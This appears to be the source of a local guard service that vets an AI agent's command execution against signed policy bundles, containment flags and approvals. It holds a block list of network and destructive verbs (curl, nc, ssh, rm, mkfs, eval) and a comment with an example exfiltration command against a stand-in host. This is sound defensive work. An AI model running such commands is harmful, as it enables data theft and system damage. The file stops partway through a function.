#!/usr/bin/env node
/**
 * vaibot-guard-service (MVP)
 *
 * Local policy decision service for tool execution.
 *
 * Endpoints:
 * - GET  /health
 * - POST /v1/decide/exec
 * - POST /v1/finalize
 */

import http from "node:http";
import https from "node:https";
import { createHash, randomUUID } from "node:crypto";
import fs from "node:fs";
import path from "node:path";
import { classify, toolKind } from "./classifier.mjs";
import { receiptOutcome, actionVerbFor } from "./lib/receipt-shape.mjs";
import { loadPolicyBundle, effectivePolicy, computeBundleHash, verifyBundle } from "./policy-bundle.mjs";
import { pickPolicyPubkey } from "./pinned-keys.mjs";
import { writeLock, readLock, LOCK_FILE, readContainment, writeContainment } from "./lib/guard-bootstrap.mjs";
import { loadGuardEnvFile } from "./lib/env-file.mjs";
import { loadStore, resolveEnv, loadCredsForEnv, governanceBaseForEnv, provenanceBaseForEnv, urlOverrideAllowed, gateUrlOverride, readGuardEndpoint } from "./lib/creds.mjs";

// One shared guard, one config — regardless of launcher. Under systemd the env is
// already populated from EnvironmentFile=~/.config/vaibot-guard/vaibot-guard.env;
// when a plugin cold-starts the SAME guard via ensureGuard (self-spawn), nothing
// sources that file. Fill any UNSET keys from it here so a self-spawned guard reads
// the identical config the CLI pinned (VAIBOT_POLICY_URL + VAIBOT_POLICY_PUBKEY,
// etc.). Real env always wins, so this is a no-op under systemd and never overrides
// the launcher's scanned port/token. Must run before the first process.env read.
const _envFileKeys = loadGuardEnvFile();
if (_envFileKeys.length) {
  console.error(`[vaibot-guard] filled ${_envFileKeys.length} setting(s) from vaibot-guard.env: ${_envFileKeys.join(", ")}`);
}

// Port precedence: explicit env (launcher scan / systemd env file) → the persisted
// credentials.json endpoint → a last-resort default hint. Never a hardcoded contract.
const PORT = Number(process.env.VAIBOT_GUARD_PORT) || readGuardEndpoint()?.port || 39111;
const HOST = process.env.VAIBOT_GUARD_HOST || "127.0.0.1";

// ---- API config from the credentials file (v3 split: V2 governance / V1 provenance)
// The guard derives its api key + governance/provenance bases from the resolved
// env's slot in ~/.vaibot/credentials.json, so the V2 + V1 bases travel WITH the key
// — there is no standalone VAIBOT_API_URL that could pair a staging key with a prod
// endpoint (the bug this fixes). Explicit/legacy env overrides are still honored:
//   VAIBOT_API_KEY        → bearer (else the env's stored key)
//   VAIBOT_GOVERNANCE_URL → V2 base (policy / mode / decide / receipts)
//   VAIBOT_PROVENANCE_URL → V1 base (/prove)
//   VAIBOT_POLICY_URL     → policy feed (else derived as {governance}/v2/policy)
// Deprecated VAIBOT_API_URL overrides NEITHER base — it only drives env inference
// (resolveEnv). It's too overloaded to alias safely: the CLI used it as the V2 base,
// the old guard used it as the /prove base. Redirects need the explicit per-API vars.
const CREDS_STORE = loadStore();
const CREDS_ENV = resolveEnv({ store: CREDS_STORE });
const VAIBOT_API_KEY =
  process.env.VAIBOT_API_KEY || loadCredsForEnv(CREDS_ENV, { store: CREDS_STORE })?.api_key || "";

// §5 url-override gate (mirrors the CLI). CANONICAL_GOVERNANCE_BASE is override-free
// and is what the /me poll (mode + admin) talks to — so a URL override can never spoof
// the admin verdict. The EFFECTIVE bases apply the flag-gate: a PRODUCTION override is
// dropped unless VAIBOT_ALLOW_URL_OVERRIDE is set; a flag-enabled prod override is
// "provisional" until the poll confirms admin, then a non-admin's override is revoked.
const ALLOW_URL_OVERRIDE = urlOverrideAllowed(process.env);
const GOV_OVERRIDE_REQ = process.env.VAIBOT_GOVERNANCE_URL || "";
const PROV_OVERRIDE_REQ = process.env.VAIBOT_PROVENANCE_URL || "";
const CANONICAL_GOVERNANCE_BASE = governanceBaseForEnv(CREDS_STORE, CREDS_ENV, null);
// Flag-gated overrides (null when a prod override lacks VAIBOT_ALLOW_URL_OVERRIDE).
const GOV_OVERRIDE = gateUrlOverride(CREDS_ENV, GOV_OVERRIDE_REQ, ALLOW_URL_OVERRIDE);
const PROV_OVERRIDE = gateUrlOverride(CREDS_ENV, PROV_OVERRIDE_REQ, ALLOW_URL_OVERRIDE);
const IS_PROD = CREDS_ENV === "production";
// CONFIRM-THEN-APPLY: a flag-enabled PRODUCTION override is NOT used for key-sending
// until the /me poll confirms admin (no key-leak window). Non-prod overrides apply at
// once. So prod starts on canonical even when a flag-enabled override is present.
let GOVERNANCE_BASE = governanceBaseForEnv(CREDS_STORE, CREDS_ENV, IS_PROD ? null : GOV_OVERRIDE);
let PROVENANCE_BASE = provenanceBaseForEnv(CREDS_STORE, CREDS_ENV, IS_PROD ? null : PROV_OVERRIDE);
let PROD_OVERRIDE_PENDING = IS_PROD && !!(GOV_OVERRIDE || PROV_OVERRIDE);
if (IS_PROD) {
  for (const [label, req] of [
    ["VAIBOT_GOVERNANCE_URL", GOV_OVERRIDE_REQ],
    ["VAIBOT_PROVENANCE_URL", PROV_OVERRIDE_REQ],
  ]) {
    if (!req) continue;
    if (!ALLOW_URL_OVERRIDE)
      console.error(`[vaibot-guard] ignoring production ${label} override (${req}); key stays on canonical host — set VAIBOT_ALLOW_URL_OVERRIDE=1 (admin only).`);
    else
      console.error(`[vaibot-guard] production ${label} override (${req}) deferred — applied only after /me confirms an admin account.`);
  }
}

// Control-plane policy feed. Explicit VAIBOT_POLICY_URL wins; the sentinels
// "off"/"none"/"disabled" turn fetching OFF (offline / air-gapped guard → only the
// built-in defaults + any local VAIBOT_POLICY_BUNDLE_PATH apply); unset ⇒ derive
// {governance}/v2/policy so a guard still tracks live policy even when the launcher
// never pinned a URL (closes the "no pin ⇒ never fetch" gap).
const _policyUrlEnv = (process.env.VAIBOT_POLICY_URL || "").trim();
const POLICY_URL_PINNED = _policyUrlEnv.length > 0; // explicit (incl. off-sentinel) ⇒ don't re-derive on revoke
let POLICY_URL = /^(off|none|disabled)$/i.test(_policyUrlEnv)
  ? ""
  : _policyUrlEnv || `${GOVERNANCE_BASE}/v2/policy`;

// Per-account policy: with an API key, GET /v2/policy answers with THIS
// account's effective bundle — the admin-set global default plus whatever the
// account changed for itself. Without one it answers with the default, which is
// what a guard predating per-account policy fetches and enforces.
//
// The key travels ONLY to the canonical control plane (or the governance base
// already trusted with it for receipts). A VAIBOT_POLICY_URL pinned anywhere
// else is fetched unauthenticated, so a URL override can never divert
// credentials — the same rule the mode poll follows. The Ed25519 signature
// stays the trust anchor either way, which is why the unauthenticated fetch is
// still safe.
function sameOrigin(a, b) {
  try {
    return new URL(a).origin === new URL(b).origin;
  } catch {
    return false;
  }
}
function policyFetchHeaders() {
  if (!VAIBOT_API_KEY || !POLICY_URL) return {};
  const trusted = [CANONICAL_GOVERNANCE_BASE, GOVERNANCE_BASE].filter(Boolean).some((base) => sameOrigin(POLICY_URL, base));
  return trusted ? { authorization: `Bearer ${VAIBOT_API_KEY}` } : {};
}

// Identity surfaced on /health so ensureGuard() (and any client) can confirm
// the process on this port is really the VAIBot guard and is version-compatible
// — not a foreign squatter. INSTANCE_ID is unique per process start.
const GUARD_VERSION = process.env.VAIBOT_GUARD_VERSION || (() => {
  try {
    return JSON.parse(fs.readFileSync(new URL("../package.json", import.meta.url), "utf8")).version || "1.0.0";
  } catch {
    return "1.0.0";
  }
})();
const INSTANCE_ID = randomUUID();

// What this daemon's decisions understand, surfaced on /health so a client can
// adapt without version arithmetic (forks and pre-releases make that
// unreliable). Clients must read it from the LIVE daemon, never from the
// rendezvous lock, which can outlive the process that wrote it. Only daemon
// behaviour belongs here — a CLI on PATH may be a different install.
//   host-vocab:hermes — Hermes tool names (terminal, write_file, …) are
//                       classified natively, so a client may send them as-is.
//   host-bypass       — decide accepts `hostBypass: {active, mechanism}` and
//                       applies the policy's hostBypassAction itself, so a
//                       client should report the host's bypass state rather
//                       than enforce its own default.
//   rule-id           — escalations and denials carry `decision.ruleId`, the
//                       policy rule (and subject) that fired.
const GUARD_CAPABILITIES = Object.freeze(["host-vocab:hermes", "host-bypass", "rule-id"]);

const VAIBOT_LOG_RETENTION_DAYS = Math.max(1, Number(process.env.VAIBOT_LOG_RETENTION_DAYS || 14));

const WORKSPACE = process.env.VAIBOT_WORKSPACE || process.cwd();
const WORKSPACE_REAL = (() => {
  try { return fs.realpathSync(WORKSPACE); } catch { return path.resolve(WORKSPACE); }
})();
const LOG_DIR = process.env.VAIBOT_GUARD_LOG_DIR || path.join(WORKSPACE, ".vaibot-guard");
fs.mkdirSync(LOG_DIR, { recursive: true });

const SKILL_DIR = path.resolve(path.dirname(new URL(import.meta.url).pathname), "..");
const VAIBOT_POLICY_PATH = process.env.VAIBOT_POLICY_PATH || path.join(SKILL_DIR, "references", "policy.default.json");

function loadPolicy() {
  try {
    const raw = fs.readFileSync(VAIBOT_POLICY_PATH, "utf8");
    const j = JSON.parse(raw);
    // minimal sanity
    const denyTokens = Array.isArray(j.denyTokens) ? j.denyTokens.map(String) : [];
    const approveTokens = Array.isArray(j.approveTokens) ? j.approveTokens.map(String) : [];
    const allowlistedDomains = Array.isArray(j.allowlistedDomains) ? j.allowlistedDomains.map(String) : [];
    const denyPaths = Array.isArray(j.denyPaths) ? j.denyPaths.map(String) : [];
    const redactPatterns = Array.isArray(j.redactPatterns) ? j.redactPatterns.map(String) : [];
    const redactEnvKeyPatterns = Array.isArray(j.redactEnvKeyPatterns) ? j.redactEnvKeyPatterns.map(String) : [];
    const fileMutationOutsideWorkspaceAction = (j.fileMutationOutsideWorkspaceAction === "approve" ? "approve" : "deny");
    const fileMutationDeniedPathAction = (j.fileMutationDeniedPathAction === "approve" ? "approve" : "deny");
    // Tighten-only: a local "deny" overrides a signed "approve"; nothing local
    // can loosen it, so any other value is simply no opinion.
    const hostBypassAction = j.hostBypassAction === "deny" ? "deny" : undefined;
    return { version: String(j.version || ""), denyTokens, approveTokens, allowlistedDomains, denyPaths, redactPatterns, redactEnvKeyPatterns, fileMutationOutsideWorkspaceAction, fileMutationDeniedPathAction, hostBypassAction };
  } catch (e) {
    // fail closed if policy cannot be loaded
    console.error(`[vaibot-guard] failed to load policy from ${VAIBOT_POLICY_PATH}: ${e?.message || e}`);
    return null;
  }
}

const POLICY = loadPolicy();
if (!POLICY) process.exit(2);

const DENY_TOKENS = POLICY.denyTokens;
const APPROVE_TOKENS = POLICY.approveTokens;
const ALLOWLISTED_DOMAINS = POLICY.allowlistedDomains;
const DENY_PATHS = POLICY.denyPaths;
const FILE_MUTATION_OUTSIDE_WORKSPACE_ACTION = POLICY.fileMutationOutsideWorkspaceAction || "deny";
const FILE_MUTATION_DENIED_PATH_ACTION = POLICY.fileMutationDeniedPathAction || "deny";

// ---- Signed policy bundle (D): denylist (un-overridable safety floor) +
// optional classifier-ruleset overrides. Fail-closed: a missing / invalid /
// expired / unsigned bundle falls back to the safe built-in classifier defaults
// and an empty denylist — it never relaxes enforcement.
//
// The pubkey is resolved via pinned-keys.mjs so end users don't have to set
// VAIBOT_POLICY_PUBKEY themselves: the staging + prod keys ship inside the
// published package (a staging guard is picked up from VAIBOT_ENV or the pinned
// VAIBOT_POLICY_URL). VAIBOT_POLICY_PUBKEY remains an explicit override for
// local dev / CI / self-hosted setups.
// Pin the pubkey for the env the creds file resolved to (so a staging guard gets
// the staging key even when VAIBOT_ENV/VAIBOT_POLICY_URL aren't set in the env).
const POLICY_PUBKEY = pickPolicyPubkey({ ...process.env, VAIBOT_ENV: CREDS_ENV });
// When fetching from the control plane we cache to a WRITABLE path (LOG_DIR)
// rather than the read-only skill references dir.
const POLICY_BUNDLE_PATH =
  process.env.VAIBOT_POLICY_BUNDLE_PATH ||
  (POLICY_URL
    ? path.join(LOG_DIR, "policy.bundle.json")
    : path.join(SKILL_DIR, "references", "policy.bundle.json"));

// G-163: a signed bundle may ENRICH the classifier tables but must never RELAX
// an inherently dangerous verb to "safe". The destructive-command floor (rm -rf,
// curl|sh, fork bombs, mkfs, ...) is hard-coded in the classifier and is NOT
// table-driven, so a bundle can't relax it. But a bundle could still move a
// network/destructive verb into safeCmds (e.g. have `curl http://exfil/?x=...`
// classified safe). Reject such tables wholesale and fall back to the built-in
// defaults (fail-closed). The same posture must apply to allow-grants when F lands.
const PROTECTED_VERBS = new Set([
  "rm", "rmdir", "dd", "mkfs", "shred", "chmod", "chown",
  "shutdown", "reboot", "halt", "poweroff", "kill", "killall",
  "sudo", "su", "eval",
  "curl", "wget", "nc", "ncat", "netcat", "ssh", "scp", "sftp", "rsync", "telnet", "ftp",
]);
function classifierTablesAreSafe(tables) {
  if (!tables || typeof tables !== "object") return true; // no override → built-in
  const safeCmds = Array.isArray(tables.safeCmds) ? tables.safeCmds : [];
  for (const cmd of safeCmds) {
    if (PROTECTED_VERBS.has(String(cmd).trim().toLowerCase())) return false;
  }
  return true;
}

// Mutable policy state (F-157): refreshed at runtime so policy changes AND
// revocations propagate without a guard restart. The decision functions and
// /v1/policy read these `let` bindings live.
let POLICY_BUNDLE;     // last loadPolicyBundle()-shaped result { ok, reason, policy, bundle }
let SIGNED_POLICY;     // effectivePolicy(POLICY_BUNDLE)
let SIGNED_DENYLIST;   // SIGNED_POLICY.denylist
let SIGNED_DENYTOKENS; // SIGNED_POLICY.denyTokens — word-boundary command-family denials
let SIGNED_APPROVETOKENS; // SIGNED_POLICY.approveTokens — word-boundary ask escalations
let SIGNED_ESCALATE_AT;   // SIGNED_POLICY.escalateAt — per-preset ask threshold (undefined ⇒ default MEDIUM)
let SIGNED_DENYPATHS;     // SIGNED_POLICY.denyPaths — unioned onto local DENY_PATHS
let EFFECTIVE_FILEMUT_ACTION = FILE_MUTATION_OUTSIDE_WORKSPACE_ACTION; // local ∪ signed (deny wins)
let CLASSIFIER_TABLES; // SIGNED_POLICY.classifierTables, after the G-163 safety gate
let EFFECTIVE_HOST_BYPASS_ACTION = "deny"; // signed decides; a local policy file can only tighten

function applyLoadedBundle(loadResult) {
  POLICY_BUNDLE = loadResult;
  SIGNED_POLICY = effectivePolicy(POLICY_BUNDLE);
  SIGNED_DENYLIST = SIGNED_POLICY.denylist;
  SIGNED_DENYTOKENS = Array.isArray(SIGNED_POLICY.denyTokens) ? SIGNED_POLICY.denyTokens : [];
  SIGNED_APPROVETOKENS = Array.isArray(SIGNED_POLICY.approveTokens) ? SIGNED_POLICY.approveTokens : [];
  SIGNED_ESCALATE_AT = typeof SIGNED_POLICY.escalateAt === "string" ? SIGNED_POLICY.escalateAt : undefined;
  SIGNED_DENYPATHS = Array.isArray(SIGNED_POLICY.denyPaths) ? SIGNED_POLICY.denyPaths : [];
  // Tighten-only: a signed bundle can escalate outside-workspace writes to deny, never relax to approve.
  EFFECTIVE_FILEMUT_ACTION =
    (FILE_MUTATION_OUTSIDE_WORKSPACE_ACTION === "deny" || SIGNED_POLICY.fileMutationOutsideWorkspaceAction === "deny")
      ? "deny"
      : "approve";
  let tables = SIGNED_POLICY.classifierTables;
  if (tables && !classifierTablesAreSafe(tables)) {
    console.error("[vaibot-guard] signed policy classifier tables would relax a protected verb to safe — rejected; using built-in defaults (fail-closed).");
    tables = undefined;
  }
  CLASSIFIER_TABLES = tables;
  // Honouring a host's approval bypass is a loosening, so only a verified bundle
  // can turn it on, and an operator's local policy file can still turn it off.
  EFFECTIVE_HOST_BYPASS_ACTION =
    SIGNED_POLICY.hostBypassAction === "approve" && POLICY.hostBypassAction !== "deny" ? "approve" : "deny";
}

// F (distribution + F-157 refresh): pull the active signed bundle from the
// control plane (GET /v2/policy), verify against the pinned public key, cache it,
// and apply it LIVE. Fail-static on transient errors (keep the current policy);
// honor an authoritative "no active policy" (revoked) by reverting to built-in
// defaults — the hard-coded destructive floor still applies, so a revocation can
// only drop user-added denials, never relax the safety net.
async function refreshPolicy() {
  const url = POLICY_URL;
  if (!url || !POLICY_PUBKEY) return;
  let data;
  try {
    const headers = policyFetchHeaders();
    const res = await fetch(url, {
      headers,
      signal: AbortSignal.timeout(Number(process.env.VAIBOT_POLICY_FETCH_TIMEOUT_MS || 3000)),
    });
    if (!res.ok) {
      // Fail-static, including on 401/403: an account whose policy is TIGHTER
      // than the global default must not be loosened to the default just
      // because its key was rejected. Retrying unauthenticated would do exactly
      // that, so we keep enforcing what we have.
      const why = headers.authorization && (res.status === 401 || res.status === 403)
        ? " (API key rejected — not falling back to the global default)"
        : "";
      console.error(`[vaibot-guard] policy fetch ${res.status} from ${url}${why} — keeping current policy.`);
      return;
    }
    data = await res.json().catch(() => null);
  } catch (e) {
    console.error(`[vaibot-guard] policy fetch failed (${e?.message || e}) — keeping current policy.`);
    return;
  }
  if (!data || data.ok !== true) {
    console.error("[vaibot-guard] malformed policy response — keeping current policy.");
    return;
  }

  const bundle = data.bundle ?? null;
  if (bundle) {
    const v = verifyBundle(bundle, POLICY_PUBKEY);
    if (!v.ok) {
      console.error(`[vaibot-guard] fetched policy failed verification (${v.reason}) — keeping current policy.`);
      return;
    }
    const changed =
      !POLICY_BUNDLE?.bundle ||
      POLICY_BUNDLE.bundle.version !== bundle.version ||
      SIGNED_POLICY.source !== "bundle";
    try {
      const tmp = POLICY_BUNDLE_PATH + ".tmp";
      fs.writeFileSync(tmp, JSON.stringify(bundle));
      fs.renameSync(tmp, POLICY_BUNDLE_PATH);
    } catch {
      /* cache write is best-effort */
    }
    applyLoadedBundle({ ok: true, reason: "ok", policy: bundle.policy, bundle });
    if (changed) {
      // scope: 'account' = this account's own policy, 'default' = the admin's.
      const tier = data.scope === "account" ? "account" : "default";
      console.error(`[vaibot-guard] policy applied from control plane (version ${bundle.version || "?"}, ${tier}).`);
    }
  } else if (SIGNED_POLICY.source !== "builtin") {
    // Authoritative withdrawal/revocation: server reports no active policy.
    console.error("[vaibot-guard] control plane reports no active policy (revoked) — reverting to built-in defaults.");
    try { fs.rmSync(POLICY_BUNDLE_PATH, { force: true }); } catch { /* best effort */ }
    applyLoadedBundle({ ok: false, reason: "revoked", policy: null, bundle: null });
  }
}

// Initial load from the local/cached bundle (or built-in), then an immediate
// control-plane refresh + a periodic refresh timer when configured.
applyLoadedBundle(loadPolicyBundle({ path: POLICY_BUNDLE_PATH, publicKeyPem: POLICY_PUBKEY }));
if (POLICY_BUNDLE.bundle && !POLICY_BUNDLE.ok) {
  console.error(`[vaibot-guard] signed policy bundle invalid (${POLICY_BUNDLE.reason}) — using built-in defaults (fail-closed).`);
}
if (POLICY_URL && POLICY_PUBKEY) {
  await refreshPolicy();
  const everyMs = Math.max(1000, Number(process.env.VAIBOT_POLICY_REFRESH_MS || 300_000));
  setInterval(() => { refreshPolicy().catch(() => {}); }, everyMs).unref();
} else if (POLICY_URL && !POLICY_PUBKEY) {
  console.error("[vaibot-guard] policy feed configured but VAIBOT_POLICY_PUBKEY missing — cannot verify a fetched bundle; skipping fetch (fail-closed).");
}

// ---- Receipt tiering (M): the same classifier that drives decisions also
// decides what earns a tier-2 signed receipt. Egress/network or high/dangerous
// calls return "receipt"; everything else is "ledger" (tier-1 Merkle log only).
// One classifier, two outputs — no separate hand-maintained list.
function receiptTierForTool(toolName, params) {
  return classify({ tool: toolName, input: params }, { tables: CLASSIFIER_TABLES }).receiptTier;
}
function receiptTierForExec(cmd, args) {
  const command = [String(cmd || ""), ...(Array.isArray(args) ? args.map(String) : [])].join(" ");
  return classify({ tool: "exec", input: { command } }, { tables: CLASSIFIER_TABLES }).receiptTier;
}

const VAIBOT_PROVE_MODEL = process.env.VAIBOT_PROVE_MODEL || "vaibot-guard"; // /api/prove requires model

// ---- Effective enforce/observe mode (guard = single source of truth) ---------
// The guard does NOT apply observe/enforce itself — it returns raw decisions plus
// the un-overridable Tier-0 `floor`. It RESOLVES the account mode from the control
// plane and PUBLISHES it (in every decide response, in guard.json, and on /health)
// so the plugins/CLI/gateway all read ONE consistent value instead of each fetching
// it (that would be N enforcement surfaces). Source of truth: GET /v2/accounts/me
// `enforcement.effective_mode` (api-key auth). Until the server answers we fall back
// to VAIBOT_MODE env, else strict 'enforce'. FAIL-STATIC: a transient poll failure
// or a malformed value keeps the last good mode — a blip must never silently
// downgrade enforce→observe. `floor:true` still blocks in EVERY mode (client-side).
function normalizeMode(m) {
  return String(m || "").toLowerCase() === "observe" ? "observe" : "enforce";
}
let EFFECTIVE_MODE = normalizeMode(process.env.VAIBOT_MODE || "enforce");

// ---- Containment switch (Tier-0) --------------------------------------------
// When ARMED, every decision short-circuits to a floor-deny BEFORE policy/classifier:
//  * `floor:true` ⇒ it holds even in observe (clients enforce Tier-0 regardless of mode);
//  * pre-classifier ⇒ independent of a fetchable/correct/signed policy — it fires even when
//    the control plane is unreachable or the policy is empty/compromised.
// NO local arming lever (no env var, no agent-reachable file): a local toggle would be an
// escape hatch and conflicts with "the control plane is the chokepoint" (worse here because the
// guard is often self-spawned by the plugin). The flag is set ONLY by adopting the
// server-authoritative `enforcement.contained` from the /me poll (adoptContainment) — one
// source of truth. A later phase drives it from the control-plane lease (guard.json
// valid_until) + a fast incident poll.
let CONTAINMENT_ARMED = false;
// Why it was engaged, so an offline breaker can say more than "blocked".
let CONTAINMENT_REASON = null;

// Containment SURVIVES A RESTART. A contained machine that comes back
// permissive because someone restarted the process defeats the point, so the
// armed state is cached next to the policy bundle and re-applied at boot,
// before the first decision is served. The control plane stays authoritative:
// the stream sends current state on connect, so a release that happened while
// this guard was down is adopted as soon as it reconnects.
// Machine-wide, in the shared rendezvous dir — not a workspace log dir. Every
// breaker on the machine reads the same file, which is what makes containment
// hold on the paths that never reach this daemon at all.
function loadContainment() {
  return readContainment().contained;
}

function persistContainment(armed, reason = null) {
  writeContainment(armed, reason);
}

function containmentDecision() {
  return { decision: "deny", reason: "VAIBot containment engaged — all actions blocked (Tier-0).", floor: true };
}
// FAIL-STATIC: only an explicit boolean flips containment; a malformed/absent value keeps the
// last-known state so a transient poll blip can never silently LIFT containment.
function adoptContainment(v, source) {
  if (typeof v !== "boolean") return false;
  if (v === CONTAINMENT_ARMED) return false;
  CONTAINMENT_ARMED = v;
  persistContainment(v, v ? CONTAINMENT_REASON : null);
  console.error(`[vaibot-guard] containment ${v ? "ARMED" : "cleared"} (${source}).`);
  return true;
}

// Re-arm from the cache at boot, before anything can be decided.
if (loadContainment()) {
  CONTAINMENT_ARMED = true;
  console.error("[vaibot-guard] containment ARMED (restored from cache) — awaiting control plane.");
}

// Re-stamp guard.json with the current mode (only if WE still own the lock) so
// offline readers (CLI, gateway) see a live value without issuing a decide call.
function republishMode() {
  try {
    const l = readLock();
    if (l && l.pid === process.pid) writeLock({ ...l, effective_mode: EFFECTIVE_MODE });
  } catch {
    /* best-effort: decide responses + /health stay authoritative regardless */
  }
}

// §5: apply a deferred production URL override once /me confirms an admin account.
// Until then the guard runs on the canonical host, so a non-admin's prod key is never
// diverted (and there's no startup key-leak window). Idempotent.
function applyProdOverride() {
  PROD_OVERRIDE_PENDING = false;
  GOVERNANCE_BASE = governanceBaseForEnv(CREDS_STORE, CREDS_ENV, GOV_OVERRIDE);
  PROVENANCE_BASE = provenanceBaseForEnv(CREDS_STORE, CREDS_ENV, PROV_OVERRIDE);
  if (!POLICY_URL_PINNED) POLICY_URL = `${GOVERNANCE_BASE}/v2/policy`;
  console.error("[vaibot-guard] production URL override applied (admin account confirmed).");
}

async function refreshEffectiveMode() {
  // Always talk to the CANONICAL host (override-free) so a URL override can't spoof
  // either the mode or the admin verdict.
  if (!CANONICAL_GOVERNANCE_BASE || !VAIBOT_API_KEY) return; // no control plane / no creds → keep current (fail-static)
  try {
    // Report what this guard is actually running, so the control plane can tell
    // an account that a policy it just set is not enforced yet — either because
    // the guard is too old to fetch a per-account bundle, or because it has not
    // picked the new version up. Headers, not query params: this is metadata
    // about the client, and the URL stays the one thing it has always been.
    const enforcingVersion = SIGNED_POLICY?.source === "bundle" ? POLICY_BUNDLE?.bundle?.version : null;
    const res = await fetch(`${CANONICAL_GOVERNANCE_BASE}/v2/accounts/me`, {
      headers: {
        authorization: `Bearer ${VAIBOT_API_KEY}`,
        "x-vaibot-guard-version": GUARD_VERSION,
        ...(enforcingVersion ? { "x-vaibot-policy-version": enforcingVersion } : {}),
      },
      signal: AbortSignal.timeout(Number(process.env.VAIBOT_MODE_FETCH_TIMEOUT_MS || 3000)),
    });
    if (!res.ok) return; // transient/auth blip → fail-static
    const data = await res.json().catch(() => null);
    if (!data) return;
    // Adopt containment independently of mode validity — a malformed effective_mode below
    // must NOT cause us to skip a control-plane `contained` signal.
    adoptContainment(data?.enforcement?.contained, "control plane");
    // Apply a deferred prod override only for an admin; otherwise leave it on canonical.
    if (PROD_OVERRIDE_PENDING) {
      if (data.admin === true) {
        applyProdOverride();
      } else {
        PROD_OVERRIDE_PENDING = false;
        console.error("[vaibot-guard] production URL override refused (not an admin account) — staying on the canonical host.");
      }
    }
    const m = data?.enforcement?.effective_mode;
    if (m !== "observe" && m !== "enforce") return; // malformed/absent → fail-static
    if (m !== EFFECTIVE_MODE) {
      EFFECTIVE_MODE = m;
      republishMode();
      console.error(`[vaibot-guard] effective mode = '${m}' (control plane).`);
    }
  } catch {
    /* fail-static: keep the last good EFFECTIVE_MODE */
  }
}

// ---- Containment stream -----------------------------------------------------
//
// The /me poll is a five-minute reconciliation floor. It is NOT the latency
// path for containment: a panic switch that takes five minutes to arrive is not
// a panic switch. GET /v2/enforcement/stream pushes transitions instead, and
// sends the current state on connect — so reconnecting after a drop is itself
// the resync, and a release that happened while this guard was down is adopted
// as soon as it comes back.
//
// A dropped stream NEVER lifts containment: only an explicit boolean from the
// control plane moves the flag, so losing the connection leaves the last known
// state in force (fail-static, same rule as the poll).
let CONTAINMENT_STREAM_ABORT = null;

async function streamContainment() {
  if (!CANONICAL_GOVERNANCE_BASE || !VAIBOT_API_KEY) return;
  const url = `${CANONICAL_GOVERNANCE_BASE}/v2/enforcement/stream`;
  let backoffMs = 1000;

  for (;;) {
    const ac = new AbortController();
    CONTAINMENT_STREAM_ABORT = ac;
    try {
      const res = await fetch(url, {
        headers: { authorization: `Bearer ${VAIBOT_API_KEY}`, accept: "text/event-stream" },
        signal: ac.signal,
      });
      if (!res.ok || !res.body) throw new Error(`stream ${res.status}`);

      // Connected: reset the backoff so a long-lived stream that eventually
      // drops reconnects promptly rather than at yesterday's delay.
      backoffMs = 1000;
      console.error("[vaibot-guard] containment stream connected.");

      const decoder = new TextDecoder();
      let buffer = "";
      for await (const chunk of res.body) {
        buffer += decoder.decode(chunk, { stream: true });
        const frames = buffer.split("\n\n");
        buffer = frames.pop() ?? "";
        for (const frame of frames) {
          const dataLine = frame.split("\n").find((l) => l.startsWith("data:"));
          if (!dataLine) continue; // a ': ping' keepalive
          try {
            const payload = JSON.parse(dataLine.slice(5).trim());
            if (typeof payload?.reason === "string") CONTAINMENT_REASON = payload.reason;
            adoptContainment(payload?.contained, payload?.snapshot ? "stream (snapshot)" : "stream");
          } catch {
            /* a malformed frame must not move the flag */
          }
        }
      }
    } catch (e) {
      if (ac.signal.aborted) return; // shutting down
      console.error(`[vaibot-guard] containment stream lost (${e?.message || e}) — retrying, containment unchanged.`);
    }

    // Reconnect with jitter so a control-plane restart doesn't stampede every
    // guard back at the same instant.
    const jittered = backoffMs + Math.floor(Math.random() * 500);
    await new Promise((r) => setTimeout(r, jittered));
    backoffMs = Math.min(backoffMs * 2, 30_000);
  }
}

if (CANONICAL_GOVERNANCE_BASE && VAIBOT_API_KEY) {
  streamContainment().catch((e) => console.error(`[vaibot-guard] containment stream stopped: ${e?.message || e}`));
}

// Poll the control plane for the account mode on its own timer (non-blocking at
// boot — guard.json starts on the fail-safe default and is re-stamped within
// seconds when the server answers).
if (CANONICAL_GOVERNANCE_BASE && VAIBOT_API_KEY) {
  refreshEffectiveMode().catch(() => {});
  // 5min default: enforce/observe changes are human-initiated, so the background poll is
  // only a safety net — for immediacy use `vaibot mode show` (↵ forces a re-poll) or
  // POST /v1/mode/refresh. Override with VAIBOT_MODE_REFRESH_MS.
  const modeEveryMs = Math.max(1000, Number(process.env.VAIBOT_MODE_REFRESH_MS || 300_000));
  setInterval(() => { refreshEffectiveMode().catch(() => {}); }, modeEveryMs).unref();
}

// Persist run context so finalize receipts can include intent+decision+result even across service restarts.
// Stored under VAIBOT_GUARD_LOG_DIR as: runctx/<runId>.json
const RUNCTX_DIR = path.join(LOG_DIR, "runctx");
fs.mkdirSync(RUNCTX_DIR, { recursive: true });

// Approvals are EPHEMERAL: held in memory only, scoped to the daemon's lifetime
// (= the agent session), and NEVER written to disk. This is a security invariant
// of the no-allowlist model (plan D-140): a human's in-session "yes" must not be
// persisted, replayed across sessions, or exfiltrated from disk. The
// decide -> resolve -> redeem round-trip all hits this same long-lived daemon
// process, so an in-memory Map suffices; disk only ever bought survival across
// restarts, which is exactly what we must NOT have here.
//
// D-141: no code path mints a permanent/durable grant locally. Every approval
// carries a finite TTL, and the only durable policy source is the server-signed
// bundle (loaded + verified at startup). Permanence is online-only by construction.
const APPROVALS = new Map(); // approvalId -> record (in-memory, never persisted)

const VAIBOT_APPROVAL_TTL_MS = Math.max(30_000, Number(process.env.VAIBOT_APPROVAL_TTL_MS || 5 * 60_000));

function isApprovalExpired(rec) {
  return Boolean(rec?.expiresAt) && Date.now() > Date.parse(rec.expiresAt);
}

// Bound memory: drop terminal records (used/denied/expired) once past their TTL.
function pruneApprovals() {
  for (const [id, rec] of APPROVALS) {
    const terminal = rec.status === "used" || rec.status === "denied" || rec.status === "expired";
    if (terminal && isApprovalExpired(rec)) APPROVALS.delete(id);
  }
}

function writeApproval(rec) {
  APPROVALS.set(rec.approvalId, rec);
}

function readApproval(approvalId) {
  return APPROVALS.get(approvalId) || null;
}

function listApprovals({ status, sessionId } = {}) {
  const out = [];
  for (const rec of APPROVALS.values()) {
    // expire pending approvals lazily
    if (rec.status === "pending" && isApprovalExpired(rec)) {
      rec.status = "expired";
    }

    if (status && rec.status !== status) continue;
    if (sessionId && rec.sessionId !== sessionId) continue;
    out.push(rec);
  }
  // newest first
